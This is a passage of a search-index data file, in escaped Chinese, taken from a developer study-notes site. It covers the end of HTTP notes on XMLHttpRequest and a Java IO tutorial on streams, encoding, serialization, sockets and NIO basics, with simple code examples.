\u54CD\u5E94\u62A5\u6587\u7684 Cache-Control \u9996\u90E8\u5B57\u6BB5\u6CA1\u6709\u6307\u5B9A\u4E0D\u8FDB\u884C\u7F13\u5B58\u3002`},{header:"XMLHttpRequest",slug:"xmlhttprequest",content:`\u4E3A\u4E86\u9610\u8FF0 POST \u548C GET \u7684\u53E6\u4E00\u4E2A\u533A\u522B\uFF0C\u9700\u8981\u5148\u4E86\u89E3 XMLHttpRequest\uFF1A XMLHttpRequest \u662F\u4E00\u4E2A API\uFF0C\u5B83\u4E3A\u5BA2\u6237\u7AEF\u63D0\u4F9B\u4E86\u5728\u5BA2\u6237\u7AEF\u548C\u670D\u52A1\u5668\u4E4B\u95F4\u4F20\u8F93\u6570\u636E\u7684\u529F\u80FD\u3002\u5B83\u63D0\u4F9B\u4E86\u4E00\u4E2A\u901A\u8FC7 URL \u6765\u83B7\u53D6\u6570\u636E\u7684\u7B80\u5355\u65B9\u5F0F\uFF0C\u5E76\u4E14\u4E0D\u4F1A\u4F7F\u6574\u4E2A\u9875\u9762\u5237\u65B0\u3002\u8FD9\u4F7F\u5F97\u7F51\u9875\u53EA\u66F4\u65B0\u4E00\u90E8\u5206\u9875\u9762\u800C\u4E0D\u4F1A\u6253\u6270\u5230\u7528\u6237\u3002XMLHttpRequest \u5728 AJAX \u4E2D\u88AB\u5927\u91CF\u4F7F\u7528\u3002 \u5728\u4F7F\u7528 XMLHttpRequest \u7684 POST \u65B9\u6CD5\u65F6\uFF0C\u6D4F\u89C8\u5668\u4F1A\u5148\u53D1\u9001 Header \u518D\u53D1\u9001 Data\u3002\u4F46\u5E76\u4E0D\u662F\u6240\u6709\u6D4F\u89C8\u5668\u4F1A\u8FD9\u4E48\u505A\uFF0C\u4F8B\u5982\u706B\u72D0\u5C31\u4E0D\u4F1A\u3002
\u800C GET \u65B9\u6CD5 Header \u548C Data \u4F1A\u4E00\u8D77\u53D1\u9001\u3002`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`\u4E0A\u91CE\u5BA3. \u56FE\u89E3 HTTP[M]. \u4EBA\u6C11\u90AE\u7535\u51FA\u7248\u793E, 2014.
MDN : HTTP
HTTP/2 \u7B80\u4ECB
htmlspecialchars
Difference between file URI and URL in java
How to Fix SQL Injection Using Java PreparedStatement & CallableStatement
\u6D45\u8C08 HTTP \u4E2D Get \u4E0E Post \u7684\u533A\u522B
Are http:// and www really necessary?
HTTP (HyperText Transfer Protocol)
Web-VPN: Secure Proxies with SPDY & Chrome
File:HTTP persistent connection.svg
Proxy server
What Is This HTTPS/SSL Thing And Why Should You Care?
What is SSL Offloading?
Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption
An Introduction to Mutual SSL Authentication
The Difference Between URLs and URIs
Cookie \u4E0E Session \u7684\u533A\u522B
COOKIE \u548C SESSION \u6709\u4EC0\u4E48\u533A\u522B
Cookie/Session \u7684\u673A\u5236\u4E0E\u5B89\u5168
HTTPS \u8BC1\u4E66\u539F\u7406
What is the difference between a URI, a URL and a URN?
XMLHttpRequest
XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST?
Symmetric vs. Asymmetric Encryption \u2013 What are differences?
Web \u6027\u80FD\u4F18\u5316\u4E0E HTTP/2
HTTP/2 \u7B80\u4ECB`}]},{path:"/java/Java%20IO.html",title:"Java IO",pathLocale:"/",contents:[{header:"Java IO",slug:"java-io",content:`Java IO \u4E00\u3001\u6982\u89C8
\u4E8C\u3001\u78C1\u76D8\u64CD\u4F5C
\u4E09\u3001\u5B57\u8282\u64CD\u4F5C \u5B9E\u73B0\u6587\u4EF6\u590D\u5236
\u88C5\u9970\u8005\u6A21\u5F0F \u56DB\u3001\u5B57\u7B26\u64CD\u4F5C \u7F16\u7801\u4E0E\u89E3\u7801
String \u7684\u7F16\u7801\u65B9\u5F0F
Reader \u4E0E Writer
\u5B9E\u73B0\u9010\u884C\u8F93\u51FA\u6587\u672C\u6587\u4EF6\u7684\u5185\u5BB9 \u4E94\u3001\u5BF9\u8C61\u64CD\u4F5C \u5E8F\u5217\u5316
Serializable
transient \u516D\u3001\u7F51\u7EDC\u64CD\u4F5C InetAddress
URL
Sockets
Datagram \u4E03\u3001NIO \u6D41\u4E0E\u5757
\u901A\u9053\u4E0E\u7F13\u51B2\u533A 1. \u901A\u9053
2. \u7F13\u51B2\u533A \u7F13\u51B2\u533A\u72B6\u6001\u53D8\u91CF
\u6587\u4EF6 NIO \u5B9E\u4F8B
\u9009\u62E9\u5668 1. \u521B\u5EFA\u9009\u62E9\u5668
2. \u5C06\u901A\u9053\u6CE8\u518C\u5230\u9009\u62E9\u5668\u4E0A
3. \u76D1\u542C\u4E8B\u4EF6
4. \u83B7\u53D6\u5230\u8FBE\u7684\u4E8B\u4EF6
5. \u4E8B\u4EF6\u5FAA\u73AF \u5957\u63A5\u5B57 NIO \u5B9E\u4F8B
\u5185\u5B58\u6620\u5C04\u6587\u4EF6
\u5BF9\u6BD4 \u516B\u3001\u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u6982\u89C8",slug:"\u4E00\u3001\u6982\u89C8",content:`Java \u7684 I/O \u5927\u6982\u53EF\u4EE5\u5206\u6210\u4EE5\u4E0B\u51E0\u7C7B\uFF1A \u78C1\u76D8\u64CD\u4F5C\uFF1AFile
\u5B57\u8282\u64CD\u4F5C\uFF1AInputStream \u548C OutputStream
\u5B57\u7B26\u64CD\u4F5C\uFF1AReader \u548C Writer
\u5BF9\u8C61\u64CD\u4F5C\uFF1ASerializable
\u7F51\u7EDC\u64CD\u4F5C\uFF1ASocket
\u65B0\u7684\u8F93\u5165/\u8F93\u51FA\uFF1ANIO`},{header:"\u4E8C\u3001\u78C1\u76D8\u64CD\u4F5C",slug:"\u4E8C\u3001\u78C1\u76D8\u64CD\u4F5C",content:`File \u7C7B\u53EF\u4EE5\u7528\u4E8E\u8868\u793A\u6587\u4EF6\u548C\u76EE\u5F55\u7684\u4FE1\u606F\uFF0C\u4F46\u662F\u5B83\u4E0D\u8868\u793A\u6587\u4EF6\u7684\u5185\u5BB9\u3002
\u9012\u5F52\u5730\u5217\u51FA\u4E00\u4E2A\u76EE\u5F55\u4E0B\u6240\u6709\u6587\u4EF6\uFF1A
public static void listAllFiles(File dir) { if (dir == null || !dir.exists()) { return; } if (dir.isFile()) { System.out.println(dir.getName()); return; } for (File file : dir.listFiles()) { listAllFiles(file); }
}
\u4ECE Java7 \u5F00\u59CB\uFF0C\u53EF\u4EE5\u4F7F\u7528 Paths \u548C Files \u4EE3\u66FF File\u3002`},{header:"\u4E09\u3001\u5B57\u8282\u64CD\u4F5C",slug:"\u4E09\u3001\u5B57\u8282\u64CD\u4F5C",content:""},{header:"\u5B9E\u73B0\u6587\u4EF6\u590D\u5236",slug:"\u5B9E\u73B0\u6587\u4EF6\u590D\u5236",content:`public static void copyFile(String src, String dist) throws IOException { FileInputStream in = new FileInputStream(src); FileOutputStream out = new FileOutputStream(dist); byte[] buffer = new byte[20 * 1024]; int cnt; // read() \u6700\u591A\u8BFB\u53D6 buffer.length \u4E2A\u5B57\u8282 // \u8FD4\u56DE\u7684\u662F\u5B9E\u9645\u8BFB\u53D6\u7684\u4E2A\u6570 // \u8FD4\u56DE -1 \u7684\u65F6\u5019\u8868\u793A\u8BFB\u5230 eof\uFF0C\u5373\u6587\u4EF6\u5C3E while ((cnt = in.read(buffer, 0, buffer.length)) != -1) { out.write(buffer, 0, cnt); } in.close(); out.close();
}`},{header:"\u88C5\u9970\u8005\u6A21\u5F0F",slug:"\u88C5\u9970\u8005\u6A21\u5F0F",content:`Java I/O \u4F7F\u7528\u4E86\u88C5\u9970\u8005\u6A21\u5F0F\u6765\u5B9E\u73B0\u3002\u4EE5 InputStream \u4E3A\u4F8B\uFF0C InputStream \u662F\u62BD\u8C61\u7EC4\u4EF6\uFF1B
FileInputStream \u662F InputStream \u7684\u5B50\u7C7B\uFF0C\u5C5E\u4E8E\u5177\u4F53\u7EC4\u4EF6\uFF0C\u63D0\u4F9B\u4E86\u5B57\u8282\u6D41\u7684\u8F93\u5165\u64CD\u4F5C\uFF1B
FilterInputStream \u5C5E\u4E8E\u62BD\u8C61\u88C5\u9970\u8005\uFF0C\u88C5\u9970\u8005\u7528\u4E8E\u88C5\u9970\u7EC4\u4EF6\uFF0C\u4E3A\u7EC4\u4EF6\u63D0\u4F9B\u989D\u5916\u7684\u529F\u80FD\u3002\u4F8B\u5982 BufferedInputStream \u4E3A FileInputStream \u63D0\u4F9B\u7F13\u5B58\u7684\u529F\u80FD\u3002 \u5B9E\u4F8B\u5316\u4E00\u4E2A\u5177\u6709\u7F13\u5B58\u529F\u80FD\u7684\u5B57\u8282\u6D41\u5BF9\u8C61\u65F6\uFF0C\u53EA\u9700\u8981\u5728 FileInputStream \u5BF9\u8C61\u4E0A\u518D\u5957\u4E00\u5C42 BufferedInputStream \u5BF9\u8C61\u5373\u53EF\u3002
FileInputStream fileInputStream = new FileInputStream(filePath);
BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);
DataInputStream \u88C5\u9970\u8005\u63D0\u4F9B\u4E86\u5BF9\u66F4\u591A\u6570\u636E\u7C7B\u578B\u8FDB\u884C\u8F93\u5165\u7684\u64CD\u4F5C\uFF0C\u6BD4\u5982 int\u3001double \u7B49\u57FA\u672C\u7C7B\u578B\u3002`},{header:"\u56DB\u3001\u5B57\u7B26\u64CD\u4F5C",slug:"\u56DB\u3001\u5B57\u7B26\u64CD\u4F5C",content:""},{header:"\u7F16\u7801\u4E0E\u89E3\u7801",slug:"\u7F16\u7801\u4E0E\u89E3\u7801",content:`\u7F16\u7801\u5C31\u662F\u628A\u5B57\u7B26\u8F6C\u6362\u4E3A\u5B57\u8282\uFF0C\u800C\u89E3\u7801\u662F\u628A\u5B57\u8282\u91CD\u65B0\u7EC4\u5408\u6210\u5B57\u7B26\u3002
\u5982\u679C\u7F16\u7801\u548C\u89E3\u7801\u8FC7\u7A0B\u4F7F\u7528\u4E0D\u540C\u7684\u7F16\u7801\u65B9\u5F0F\u90A3\u4E48\u5C31\u51FA\u73B0\u4E86\u4E71\u7801\u3002 GBK \u7F16\u7801\u4E2D\uFF0C\u4E2D\u6587\u5B57\u7B26\u5360 2 \u4E2A\u5B57\u8282\uFF0C\u82F1\u6587\u5B57\u7B26\u5360 1 \u4E2A\u5B57\u8282\uFF1B
UTF-8 \u7F16\u7801\u4E2D\uFF0C\u4E2D\u6587\u5B57\u7B26\u5360 3 \u4E2A\u5B57\u8282\uFF0C\u82F1\u6587\u5B57\u7B26\u5360 1 \u4E2A\u5B57\u8282\uFF1B
UTF-16be \u7F16\u7801\u4E2D\uFF0C\u4E2D\u6587\u5B57\u7B26\u548C\u82F1\u6587\u5B57\u7B26\u90FD\u5360 2 \u4E2A\u5B57\u8282\u3002 UTF-16be \u4E2D\u7684 be \u6307\u7684\u662F Big Endian\uFF0C\u4E5F\u5C31\u662F\u5927\u7AEF\u3002\u76F8\u5E94\u5730\u4E5F\u6709 UTF-16le\uFF0Cle \u6307\u7684\u662F Little Endian\uFF0C\u4E5F\u5C31\u662F\u5C0F\u7AEF\u3002
Java \u7684\u5185\u5B58\u7F16\u7801\u4F7F\u7528\u53CC\u5B57\u8282\u7F16\u7801 UTF-16be\uFF0C\u8FD9\u4E0D\u662F\u6307 Java \u53EA\u652F\u6301\u8FD9\u4E00\u79CD\u7F16\u7801\u65B9\u5F0F\uFF0C\u800C\u662F\u8BF4 char \u8FD9\u79CD\u7C7B\u578B\u4F7F\u7528 UTF-16be \u8FDB\u884C\u7F16\u7801\u3002char \u7C7B\u578B\u5360 16 \u4F4D\uFF0C\u4E5F\u5C31\u662F\u4E24\u4E2A\u5B57\u8282\uFF0CJava \u4F7F\u7528\u8FD9\u79CD\u53CC\u5B57\u8282\u7F16\u7801\u662F\u4E3A\u4E86\u8BA9\u4E00\u4E2A\u4E2D\u6587\u6216\u8005\u4E00\u4E2A\u82F1\u6587\u90FD\u80FD\u4F7F\u7528\u4E00\u4E2A char \u6765\u5B58\u50A8\u3002`},{header:"String \u7684\u7F16\u7801\u65B9\u5F0F",slug:"string-\u7684\u7F16\u7801\u65B9\u5F0F",content:`String \u53EF\u4EE5\u770B\u6210\u4E00\u4E2A\u5B57\u7B26\u5E8F\u5217\uFF0C\u53EF\u4EE5\u6307\u5B9A\u4E00\u4E2A\u7F16\u7801\u65B9\u5F0F\u5C06\u5B83\u7F16\u7801\u4E3A\u5B57\u8282\u5E8F\u5217\uFF0C\u4E5F\u53EF\u4EE5\u6307\u5B9A\u4E00\u4E2A\u7F16\u7801\u65B9\u5F0F\u5C06\u4E00\u4E2A\u5B57\u8282\u5E8F\u5217\u89E3\u7801\u4E3A String\u3002
String str1 = "\u4E2D\u6587";
byte[] bytes = str1.getBytes("UTF-8");
String str2 = new String(bytes, "UTF-8");
System.out.println(str2);
\u5728\u8C03\u7528\u65E0\u53C2\u6570 getBytes() \u65B9\u6CD5\u65F6\uFF0C\u9ED8\u8BA4\u7684\u7F16\u7801\u65B9\u5F0F\u4E0D\u662F UTF-16be\u3002\u53CC\u5B57\u8282\u7F16\u7801\u7684\u597D\u5904\u662F\u53EF\u4EE5\u4F7F\u7528\u4E00\u4E2A char \u5B58\u50A8\u4E2D\u6587\u548C\u82F1\u6587\uFF0C\u800C\u5C06 String \u8F6C\u4E3A bytes[] \u5B57\u8282\u6570\u7EC4\u5C31\u4E0D\u518D\u9700\u8981\u8FD9\u4E2A\u597D\u5904\uFF0C\u56E0\u6B64\u4E5F\u5C31\u4E0D\u518D\u9700\u8981\u53CC\u5B57\u8282\u7F16\u7801\u3002getBytes() \u7684\u9ED8\u8BA4\u7F16\u7801\u65B9\u5F0F\u4E0E\u5E73\u53F0\u6709\u5173\uFF0C\u4E00\u822C\u4E3A UTF-8\u3002
byte[] bytes = str1.getBytes();`},{header:"Reader \u4E0E Writer",slug:"reader-\u4E0E-writer",content:`\u4E0D\u7BA1\u662F\u78C1\u76D8\u8FD8\u662F\u7F51\u7EDC\u4F20\u8F93\uFF0C\u6700\u5C0F\u7684\u5B58\u50A8\u5355\u5143\u90FD\u662F\u5B57\u8282\uFF0C\u800C\u4E0D\u662F\u5B57\u7B26\u3002\u4F46\u662F\u5728\u7A0B\u5E8F\u4E2D\u64CD\u4F5C\u7684\u901A\u5E38\u662F\u5B57\u7B26\u5F62\u5F0F\u7684\u6570\u636E\uFF0C\u56E0\u6B64\u9700\u8981\u63D0\u4F9B\u5BF9\u5B57\u7B26\u8FDB\u884C\u64CD\u4F5C\u7684\u65B9\u6CD5\u3002 InputStreamReader \u5B9E\u73B0\u4ECE\u5B57\u8282\u6D41\u89E3\u7801\u6210\u5B57\u7B26\u6D41\uFF1B
OutputStreamWriter \u5B9E\u73B0\u5B57\u7B26\u6D41\u7F16\u7801\u6210\u4E3A\u5B57\u8282\u6D41\u3002`},{header:"\u5B9E\u73B0\u9010\u884C\u8F93\u51FA\u6587\u672C\u6587\u4EF6\u7684\u5185\u5BB9",slug:"\u5B9E\u73B0\u9010\u884C\u8F93\u51FA\u6587\u672C\u6587\u4EF6\u7684\u5185\u5BB9",content:`public static void readFileContent(String filePath) throws IOException { FileReader fileReader = new FileReader(filePath); BufferedReader bufferedReader = new BufferedReader(fileReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } // \u88C5\u9970\u8005\u6A21\u5F0F\u4F7F\u5F97 BufferedReader \u7EC4\u5408\u4E86\u4E00\u4E2A Reader \u5BF9\u8C61 // \u5728\u8C03\u7528 BufferedReader \u7684 close() \u65B9\u6CD5\u65F6\u4F1A\u53BB\u8C03\u7528 Reader \u7684 close() \u65B9\u6CD5 // \u56E0\u6B64\u53EA\u8981\u4E00\u4E2A close() \u8C03\u7528\u5373\u53EF bufferedReader.close();
}`},{header:"\u4E94\u3001\u5BF9\u8C61\u64CD\u4F5C",slug:"\u4E94\u3001\u5BF9\u8C61\u64CD\u4F5C",content:""},{header:"\u5E8F\u5217\u5316",slug:"\u5E8F\u5217\u5316",content:`\u5E8F\u5217\u5316\u5C31\u662F\u5C06\u4E00\u4E2A\u5BF9\u8C61\u8F6C\u6362\u6210\u5B57\u8282\u5E8F\u5217\uFF0C\u65B9\u4FBF\u5B58\u50A8\u548C\u4F20\u8F93\u3002 \u5E8F\u5217\u5316\uFF1AObjectOutputStream.writeObject()
\u53CD\u5E8F\u5217\u5316\uFF1AObjectInputStream.readObject() \u4E0D\u4F1A\u5BF9\u9759\u6001\u53D8\u91CF\u8FDB\u884C\u5E8F\u5217\u5316\uFF0C\u56E0\u4E3A\u5E8F\u5217\u5316\u53EA\u662F\u4FDD\u5B58\u5BF9\u8C61\u7684\u72B6\u6001\uFF0C\u9759\u6001\u53D8\u91CF\u5C5E\u4E8E\u7C7B\u7684\u72B6\u6001\u3002`},{header:"Serializable",slug:"serializable",content:`\u5E8F\u5217\u5316\u7684\u7C7B\u9700\u8981\u5B9E\u73B0 Serializable \u63A5\u53E3\uFF0C\u5B83\u53EA\u662F\u4E00\u4E2A\u6807\u51C6\uFF0C\u6CA1\u6709\u4EFB\u4F55\u65B9\u6CD5\u9700\u8981\u5B9E\u73B0\uFF0C\u4F46\u662F\u5982\u679C\u4E0D\u53BB\u5B9E\u73B0\u5B83\u7684\u8BDD\u800C\u8FDB\u884C\u5E8F\u5217\u5316\uFF0C\u4F1A\u629B\u51FA\u5F02\u5E38\u3002
public static void main(String[] args) throws IOException, ClassNotFoundException { A a1 = new A(123, "abc"); String objectFile = "file/a1"; ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(objectFile)); objectOutputStream.writeObject(a1); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(objectFile)); A a2 = (A) objectInputStream.readObject(); objectInputStream.close(); System.out.println(a2);
} private static class A implements Serializable { private int x; private String y; A(int x, String y) { this.x = x; this.y = y; } @Override public String toString() { return "x = " + x + " " + "y = " + y; }
}`},{header:"transient",slug:"transient",content:`transient \u5173\u952E\u5B57\u53EF\u4EE5\u4F7F\u4E00\u4E9B\u5C5E\u6027\u4E0D\u4F1A\u88AB\u5E8F\u5217\u5316\u3002
ArrayList \u4E2D\u5B58\u50A8\u6570\u636E\u7684\u6570\u7EC4 elementData \u662F\u7528 transient \u4FEE\u9970\u7684\uFF0C\u56E0\u4E3A\u8FD9\u4E2A\u6570\u7EC4\u662F\u52A8\u6001\u6269\u5C55\u7684\uFF0C\u5E76\u4E0D\u662F\u6240\u6709\u7684\u7A7A\u95F4\u90FD\u88AB\u4F7F\u7528\uFF0C\u56E0\u6B64\u5C31\u4E0D\u9700\u8981\u6240\u6709\u7684\u5185\u5BB9\u90FD\u88AB\u5E8F\u5217\u5316\u3002\u901A\u8FC7\u91CD\u5199\u5E8F\u5217\u5316\u548C\u53CD\u5E8F\u5217\u5316\u65B9\u6CD5\uFF0C\u4F7F\u5F97\u53EF\u4EE5\u53EA\u5E8F\u5217\u5316\u6570\u7EC4\u4E2D\u6709\u5185\u5BB9\u7684\u90A3\u90E8\u5206\u6570\u636E\u3002
private transient Object[] elementData;`},{header:"\u516D\u3001\u7F51\u7EDC\u64CD\u4F5C",slug:"\u516D\u3001\u7F51\u7EDC\u64CD\u4F5C",content:`Java \u4E2D\u7684\u7F51\u7EDC\u652F\u6301\uFF1A InetAddress\uFF1A\u7528\u4E8E\u8868\u793A\u7F51\u7EDC\u4E0A\u7684\u786C\u4EF6\u8D44\u6E90\uFF0C\u5373 IP \u5730\u5740\uFF1B
URL\uFF1A\u7EDF\u4E00\u8D44\u6E90\u5B9A\u4F4D\u7B26\uFF1B
Sockets\uFF1A\u4F7F\u7528 TCP \u534F\u8BAE\u5B9E\u73B0\u7F51\u7EDC\u901A\u4FE1\uFF1B
Datagram\uFF1A\u4F7F\u7528 UDP \u534F\u8BAE\u5B9E\u73B0\u7F51\u7EDC\u901A\u4FE1\u3002`},{header:"InetAddress",slug:"inetaddress",content:`\u6CA1\u6709\u516C\u6709\u7684\u6784\u9020\u51FD\u6570\uFF0C\u53EA\u80FD\u901A\u8FC7\u9759\u6001\u65B9\u6CD5\u6765\u521B\u5EFA\u5B9E\u4F8B\u3002
InetAddress.getByName(String host);
InetAddress.getByAddress(byte[] address);`},{header:"URL",slug:"url",content:`\u53EF\u4EE5\u76F4\u63A5\u4ECE URL \u4E2D\u8BFB\u53D6\u5B57\u8282\u6D41\u6570\u636E\u3002
public static void main(String[] args) throws IOException { URL url = new URL("http://www.baidu.com"); /* \u5B57\u8282\u6D41 */ InputStream is = url.openStream(); /* \u5B57\u7B26\u6D41 */ InputStreamReader isr = new InputStreamReader(is, "utf-8"); /* \u63D0\u4F9B\u7F13\u5B58\u529F\u80FD */ BufferedReader br = new BufferedReader(isr); String line; while ((line = br.readLine()) != null) { System.out.println(line); } br.close();
}`},{header:"Sockets",slug:"sockets",content:`ServerSocket\uFF1A\u670D\u52A1\u5668\u7AEF\u7C7B
Socket\uFF1A\u5BA2\u6237\u7AEF\u7C7B
\u670D\u52A1\u5668\u548C\u5BA2\u6237\u7AEF\u901A\u8FC7 InputStream \u548C OutputStream \u8FDB\u884C\u8F93\u5165\u8F93\u51FA\u3002`},{header:"Datagram",slug:"datagram",content:`DatagramSocket\uFF1A\u901A\u4FE1\u7C7B
DatagramPacket\uFF1A\u6570\u636E\u5305\u7C7B`},{header:"\u4E03\u3001NIO",slug:"\u4E03\u3001nio",content:"\u65B0\u7684\u8F93\u5165/\u8F93\u51FA (NIO) \u5E93\u662F\u5728 JDK 1.4 \u4E2D\u5F15\u5165\u7684\uFF0C\u5F25\u8865\u4E86\u539F\u6765\u7684 I/O \u7684\u4E0D\u8DB3\uFF0C\u63D0\u4F9B\u4E86\u9AD8\u901F\u7684\u3001\u9762\u5411\u5757\u7684 I/O\u3002"},{header:"\u6D41\u4E0E\u5757",slug:"\u6D41\u4E0E\u5757",content:`I/O \u4E0E NIO \u6700\u91CD\u8981\u7684\u533A\u522B\u662F\u6570\u636E\u6253\u5305\u548C\u4F20\u8F93\u7684\u65B9\u5F0F\uFF0CI/O \u4EE5\u6D41\u7684\u65B9\u5F0F\u5904\u7406\u6570\u636E\uFF0C\u800C NIO \u4EE5\u5757\u7684\u65B9\u5F0F\u5904\u7406\u6570\u636E\u3002
\u9762\u5411\u6D41\u7684 I/O \u4E00\u6B21\u5904\u7406\u4E00\u4E2A\u5B57\u8282\u6570\u636E\uFF1A\u4E00\u4E2A\u8F93\u5165\u6D41\u4EA7\u751F\u4E00\u4E2A\u5B57\u8282\u6570\u636E\uFF0C\u4E00\u4E2A\u8F93\u51FA\u6D41\u6D88\u8D39\u4E00\u4E2A\u5B57\u8282\u6570\u636E\u3002\u4E3A\u6D41\u5F0F\u6570\u636E\u521B\u5EFA\u8FC7\u6EE4\u5668\u975E\u5E38\u5BB9\u6613\uFF0C\u94FE\u63A5\u51E0\u4E2A\u8FC7\u6EE4\u5668\uFF0C\u4EE5\u4FBF\u6BCF\u4E2A\u8FC7\u6EE4\u5668\u53EA\u8D1F\u8D23\u590D\u6742\u5904\u7406\u673A\u5236\u7684\u4E00\u90E8\u5206\u3002\u4E0D\u5229\u7684\u4E00\u9762\u662F\uFF0C\u9762\u5411\u6D41\u7684 I/O \u901A\u5E38\u76F8\u5F53\u6162\u3002
\u9762\u5411\u5757\u7684 I/O \u4E00\u6B21\u5904\u7406\u4E00\u4E2A\u6570\u636E\u5757\uFF0C\u6309\u5757\u5904\u7406\u6570\u636E\u6BD4\u6309\u6D41\u5904\u7406\u6570\u636E\u8981\u5FEB\u5F97\u591A\u3002\u4F46\u662F\u9762\u5411\u5757\u7684 I/O \u7F3A\u5C11\u4E00\u4E9B\u9762\u5411\u6D41\u7684 I/O \u6240\u5177\u6709\u7684\u4F18\u96C5\u6027\u548C\u7B80\u5355\u6027\u3002
I/O \u5305\u548C NIO \u5DF2\u7ECF\u5F88\u597D\u5730\u96C6\u6210\u4E86\uFF0Cjava.io.* \u5DF2\u7ECF\u4EE5 NIO \u4E3A\u57FA\u7840\u91CD\u65B0\u5B9E\u73B0\u4E86\uFF0C\u6240\u4EE5\u73B0\u5728\u5B83\u53EF\u4EE5\u5229\u7528 NIO \u7684\u4E00\u4E9B\u7279\u6027\u3002\u4F8B\u5982\uFF0Cjava.io.* \u5305\u4E2D\u7684\u4E00\u4E9B\u7C7B\u5305\u542B\u4EE5\u5757\u7684\u5F62\u5F0F\u8BFB\u5199\u6570\u636E\u7684\u65B9\u6CD5\uFF0C\u8FD9\u4F7F\u5F97\u5373\u4F7F\u5728\u9762\u5411\u6D41\u7684\u7CFB\u7EDF\u4E2D\uFF0C\u5904\u7406\u901F\u5EA6\u4E5F\u4F1A\u66F4\u5FEB\u3002`},{header:"\u901A\u9053\u4E0E\u7F13\u51B2\u533A",slug:"\u901A\u9053\u4E0E\u7F13\u51B2\u533A",content:""},{header:"1. \u901A\u9053",slug:"_1-\u901A\u9053",content:`\u901A\u9053 Channel \u662F\u5BF9\u539F I/O \u5305\u4E2D\u7684\u6D41\u7684\u6A21\u62DF\uFF0C\u53EF\u4EE5\u901A\u8FC7\u5B83\u8BFB\u53D6\u548C\u5199\u5165\u6570\u636E\u3002
\u901A\u9053\u4E0E\u6D41\u7684\u4E0D\u540C\u4E4B\u5904\u5728\u4E8E\uFF0C\u6D41\u53EA\u80FD\u5728\u4E00\u4E2A\u65B9\u5411\u4E0A\u79FB\u52A8(\u4E00\u4E2A\u6D41\u5FC5\u987B\u662F InputStream \u6216\u8005 OutputStream \u7684\u5B50\u7C7B)\uFF0C\u800C\u901A\u9053\u662F\u53CC\u5411\u7684\uFF0C\u53EF\u4EE5\u7528\u4E8E\u8BFB\u3001\u5199\u6216\u8005\u540C\u65F6\u7528\u4E8E\u8BFB\u5199\u3002
\u901A\u9053\u5305\u62EC\u4EE5\u4E0B\u7C7B\u578B\uFF1A FileChannel\uFF1A\u4ECE\u6587\u4EF6\u4E2D\u8BFB\u5199\u6570\u636E\uFF1B
DatagramChannel\uFF1A\u901A\u8FC7 UDP \u8BFB\u5199\u7F51\u7EDC\u4E2D\u6570\u636E\uFF1B
SocketChannel\uFF1A\u901A\u8FC7 TCP \u8BFB\u5199\u7F51\u7EDC\u4E2D\u6570\u636E\uFF1B
ServerSocketChannel\uFF1A\u53EF\u4EE5\u76D1\u542C\u65B0\u8FDB\u6765\u7684 TCP \u8FDE\u63A5\uFF0C\u5BF9\u6BCF\u4E00\u4E2A\u65B0\u8FDB\u6765\u7684\u8FDE\u63A5\u90FD\u4F1A\u521B\u5EFA\u4E00\u4E2A SocketChannel\u3002`},{header:"2. \u7F13\u51B2\u533A",slug:"_2-\u7F13\u51B2\u533A",content:`\u53D1\u9001\u7ED9\u4E00\u4E2A\u901A\u9053\u7684\u6240\u6709\u6570\u636E\u90FD\u5FC5\u987B\u9996\u5148\u653E\u5230\u7F13\u51B2\u533A\u4E2D\uFF0C\u540C\u6837\u5730\uFF0C\u4ECE\u901A\u9053\u4E2D\u8BFB\u53D6\u7684\u4EFB\u4F55\u6570\u636E\u90FD\u8981\u5148\u8BFB\u5230\u7F13\u51B2\u533A\u4E2D\u3002\u4E5F\u5C31\u662F\u8BF4\uFF0C\u4E0D\u4F1A\u76F4\u63A5\u5BF9\u901A\u9053\u8FDB\u884C\u8BFB\u5199\u6570\u636E\uFF0C\u800C\u662F\u8981\u5148\u7ECF\u8FC7\u7F13\u51B2\u533A\u3002
\u7F13\u51B2\u533A\u5B9E\u8D28\u4E0A\u662F\u4E00\u4E2A\u6570\u7EC4\uFF0C\u4F46\u5B83\u4E0D\u4EC5\u4EC5\u662F\u4E00\u4E2A\u6570\u7EC4\u3002\u7F13\u51B2\u533A\u63D0\u4F9B\u4E86\u5BF9\u6570\u636E\u7684\u7ED3\u6784\u5316\u8BBF\u95EE\uFF0C\u800C\u4E14\u8FD8\u53EF\u4EE5\u8DDF\u8E2A\u7CFB\u7EDF\u7684\u8BFB/\u5199\u8FDB\u7A0B\u3002
\u7F13\u51B2\u533A\u5305\u62EC\u4EE5\u4E0B\u7C7B\u578B\uFF1A ByteBuffer
CharBuffer
ShortBuffer
IntBuffer
LongBuffer
FloatBuffer
DoubleBuffer`},{header:"\u7F13\u51B2\u533A\u72B6\u6001\u53D8\u91CF",slug:"\u7F13\u51B2\u533A\u72B6\u6001\u53D8\u91CF",content:`capacity\uFF1A\u6700\u5927\u5BB9\u91CF\uFF1B
position\uFF1A\u5F53\u524D\u5DF2\u7ECF\u8BFB\u5199\u7684\u5B57\u8282\u6570\uFF1B
limit\uFF1A\u8FD8\u53EF\u4EE5\u8BFB\u5199\u7684\u5B57\u8282\u6570\u3002 \u72B6\u6001\u53D8\u91CF\u7684\u6539\u53D8\u8FC7\u7A0B\u4E3E\u4F8B\uFF1A
